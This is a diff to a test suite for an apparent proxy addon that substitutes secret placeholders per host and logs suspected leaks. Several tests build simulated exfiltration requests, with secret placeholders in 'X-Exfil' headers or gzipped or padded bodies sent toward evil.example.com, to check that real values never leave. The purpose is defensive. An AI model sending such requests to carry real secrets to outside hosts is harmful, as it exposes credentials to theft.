@@ -78,6 +78,24 @@ def blocked(flow):
     return flow.response is not None and flow.response.status_code in (403, 502)
 
 
+def leak_suspected(caplog, name):
+    """Did an AUDIT line record `name` passing UNSUBSTITUTED toward a host its
+    allowlist does not cover? Since #12 this, not a 403, is leak detection's
+    verdict -- so it is what a test of leak detection has to look for."""
+    for line in _audit_lines(caplog):
+        fields = dict(f.split("=", 1) for f in line.split()[1:] if "=" in f)
+        if fields.get("verdict") == "LEAK-SUSPECT" and name in fields.get("suspect", "").split(","):
+            return True
+    return False
+
+
+def carries_value(flow, value=SECRET_VALUE):
+    """Is the real value anywhere in what would leave: URL, headers or body?"""
+    return (value in flow.request.url
+            or value in str(flow.request.headers)
+            or value.encode() in (flow.request.content or b""))
+
+
 # ===========================================================================
 # demonstrated exfiltration (regression)
 # ===========================================================================
@@ -203,13 +221,44 @@ def test_requests_without_placeholders_pass_over_plaintext(tmp_path):
 # allowlist and network policy
 # ===========================================================================
 
-def test_placeholder_toward_a_non_allowlisted_host_is_blocked(tmp_path):
+def test_placeholder_toward_a_non_allowlisted_host_passes_unsubstituted(tmp_path, caplog):
+    """#12. A `git push` of code that mentions a placeholder, or an issue body
+    quoting one, carries nothing secret -- it used to be a 403 anyway. Now it
+    goes out exactly as written, and the audit says so."""
+    caplog.set_level(logging.INFO)
     _, addon, _ = load_addon(tmp_path)
     f = make_flow(sni="example.com", host_header="example.com",
                   headers={"X-Exfil": SECRET_NAME})
     addon.request(f)
-    assert blocked(f)
+    assert not blocked(f)
     assert f.request.headers["X-Exfil"] == SECRET_NAME
+    assert not carries_value(f), "the real value left toward a non-allowlisted host"
+    assert leak_suspected(caplog, SECRET_NAME)
+
+
+def test_one_request_two_secrets_only_the_allowlisted_one_is_substituted(tmp_path, caplog):
+    """The bound is per secret, not per request: a request that is legitimate
+    for one secret does not carry another one's value to the same host."""
+    caplog.set_level(logging.INFO)
+    _, addon, _ = load_addon(tmp_path, settings={
+        "default_action": "allow",
+        "secrets": {
+            SECRET_NAME: {"value": SECRET_VALUE, "hosts": ["api.openai.com"]},
+            "OTHER-GITHUB-TOKEN": {"value": "ghp-real-other", "hosts": ["api.github.com"]},
+        },
+        "network": [{"action": "allow", "host": "*"}],
+    })
+    f = make_flow(sni="api.openai.com", host_header="api.openai.com", method="POST",
+                  headers={"Authorization": f"Bearer {SECRET_NAME}"},
+                  content=b'{"note": "OTHER-GITHUB-TOKEN"}')
+    addon.request(f)
+    assert not blocked(f)
+    assert f.request.headers["Authorization"] == f"Bearer {SECRET_VALUE}"
+    assert not carries_value(f, "ghp-real-other")
+    assert b"OTHER-GITHUB-TOKEN" in f.request.content
+    assert leak_suspected(caplog, "OTHER-GITHUB-TOKEN")
+    line = next(l for l in _audit_lines(caplog) if "LEAK-SUSPECT" in l)
+    assert f"secrets={SECRET_NAME}" in line, f"the substitution is missing from: {line}"
 
 
 def test_network_policy_deny(tmp_path):
@@ -619,7 +668,7 @@ def test_E16_a_gzipped_response_echoing_a_secret_is_scrubbed(tmp_path):
     assert SECRET_VALUE.encode() not in f.response.raw_content
 
 
-def test_E16b_a_placeholder_in_a_gzipped_request_body_is_seen(tmp_path):
+def test_E16b_a_placeholder_in_a_gzipped_request_body_is_seen(tmp_path, caplog):
     """The mirror of it outbound. A placeholder inside a compressed body was
     invisible, so leak detection never ran: a request aimed at a host the
     secret is not allowlisted for went unblocked because the client had set
@@ -629,10 +678,12 @@ def test_E16b_a_placeholder_in_a_gzipped_request_body_is_seen(tmp_path):
     f = make_flow(sni="evil.example.com", host_header="evil.example.com",
                   method="POST", content=_gzip(f'{{"key":"{SECRET_NAME}"}}'.encode()))
     f.request.headers["Content-Encoding"] = "gzip"
+    caplog.set_level(logging.INFO)
 
     addon.request(f)
 
-    assert blocked(f), "placeholder toward a non-allowlisted host must be refused"
+    assert leak_suspected(caplog, SECRET_NAME), "the placeholder in a gzipped body was not seen"
+    assert not carries_value(f)
 
 
 def test_E16c_a_gzipped_request_toward_an_allowed_host_is_substituted(tmp_path):
@@ -701,7 +752,7 @@ def test_E16e_a_body_with_no_secrets_configured_is_never_decoded(tmp_path):
     assert not blocked(f)
 
 
-def test_E16f_size_is_no_longer_a_way_past_the_scrub(tmp_path):
+def test_E16f_size_is_no_longer_a_way_past_the_scrub(tmp_path, caplog):
     """The 5 MiB cap skipped inspection of anything larger, so a secret echoed
     past it went straight through. It protected nothing: mitmproxy has already
     buffered the whole body by the time this hook runs."""
@@ -716,8 +767,10 @@ def test_E16f_size_is_no_longer_a_way_past_the_scrub(tmp_path):
 
     outbound = make_flow(sni="evil.example.com", host_header="evil.example.com",
                          method="POST", content=padding + SECRET_NAME.encode())
+    caplog.set_level(logging.INFO)
     addon.request(outbound)
-    assert blocked(outbound), "a placeholder past the old cap must still be caught"
+    assert leak_suspected(caplog, SECRET_NAME), "a placeholder past the old cap must still be seen"
+    assert not carries_value(outbound)
 
 
 def test_E16g_one_body_rewrite_however_many_secrets_match(tmp_path):
@@ -1031,15 +1084,18 @@ def _fixture_settings(extra_secrets=None):
             "network": [{"action": "allow", "host": "*"}], "scrub_responses": True}
 
 
-def test_the_selftest_probe_still_trips_leak_detection(tmp_path):
+def test_the_selftest_probe_still_trips_leak_detection(tmp_path, caplog):
     """preflight's HTTPS probe: the fixture toward a host it is not
-    allowlisted for must still be a 403, or the check proves nothing."""
+    allowlisted for must produce the LEAK-SUSPECT line preflight greps for,
+    or the check proves nothing."""
+    caplog.set_level(logging.INFO)
     _, addon, _ = load_addon(tmp_path, _fixture_settings())
     f = make_flow(sni="example.com", host_header="example.com",
                   headers={"X-Exfil": FIXTURE_NAME})
     addon.request(f)
-    assert blocked(f)
+    assert leak_suspected(caplog, FIXTURE_NAME)
     assert f.request.headers["X-Exfil"] == FIXTURE_NAME
+    assert not carries_value(f, FIXTURE_VALUE)
 
 
 def test_the_selftest_plaintext_spoof_probe_still_trips(tmp_path):
@@ -1052,7 +1108,7 @@ def test_the_selftest_plaintext_spoof_probe_still_trips(tmp_path):
     assert blocked(f)
 
 
-def test_the_fixture_name_in_a_body_is_not_a_leak(tmp_path):
+def test_the_fixture_name_in_a_body_is_not_a_leak(tmp_path, caplog):
     """THE regression this flag exists for.
 
     An agent editing this repo sends a diff naming the fixture to its model
@@ -1064,9 +1120,12 @@ def test_the_fixture_name_in_a_body_is_not_a_leak(tmp_path):
     body = f'{{"diff": "+  X-Exfil: {FIXTURE_NAME}\\n"}}'.encode()
     f = make_flow(sni="api.anthropic.com", host_header="api.anthropic.com",
                   content=body, method="POST", dest="104.18.7.1")
+    caplog.set_level(logging.INFO)
     addon.request(f)
     assert f.response is None, "a body that merely names the fixture was refused"
     assert f.request.content == body, "and it must travel unmodified"
+    assert not leak_suspected(caplog, FIXTURE_NAME), \
+        "and it must not fill the audit with suspects every time this repo is pushed"
 
 
 def test_the_fixture_name_in_a_url_is_not_a_leak(tmp_path):
@@ -1100,7 +1159,7 @@ def test_the_fixture_value_is_never_scrubbed_from_a_response(tmp_path):
     assert FIXTURE_NAME.encode() not in f.response.content
 
 
-def test_the_flag_is_opt_in_and_changes_nothing_else(tmp_path):
+def test_the_flag_is_opt_in_and_changes_nothing_else(tmp_path, caplog):
     """A real secret sharing the store with the fixture keeps the ordinary
     substring rule in every position. The narrowing is per-entry, so it cannot
     loosen the bound on anything real."""
@@ -1110,12 +1169,13 @@ def test_the_flag_is_opt_in_and_changes_nothing_else(tmp_path):
     body = f'{{"key": "{SECRET_NAME}"}}'.encode()
     f = make_flow(sni="example.com", host_header="example.com",
                   content=body, method="POST", dest="104.18.7.1")
+    caplog.set_level(logging.INFO)
     addon.request(f)
-    assert blocked(f), "a REAL secret in a body must still be caught"
+    assert leak_suspected(caplog, SECRET_NAME), "a REAL secret in a body must still be seen"
     assert SECRET_VALUE.encode() not in f.request.content
 
 
-def test_a_secret_without_the_flag_keeps_the_substring_rule(tmp_path):
+def test_a_secret_without_the_flag_keeps_the_substring_rule(tmp_path, caplog):
     """The default is unchanged: absent `selftest`, a placeholder is matched
     anywhere it appears. Pins that the flag defaults to False rather than to
     whatever the last entry set."""
@@ -1127,5 +1187,6 @@ def test_a_secret_without_the_flag_keeps_the_substring_rule(tmp_path):
     f = make_flow(sni="example.com", host_header="example.com",
                   content=f"mentions {FIXTURE_NAME}".encode(), method="POST",
                   dest="104.18.7.1")
+    caplog.set_level(logging.INFO)
     addon.request(f)
-    assert blocked(f)
+    assert leak_suspected(caplog, FIXTURE_NAME)
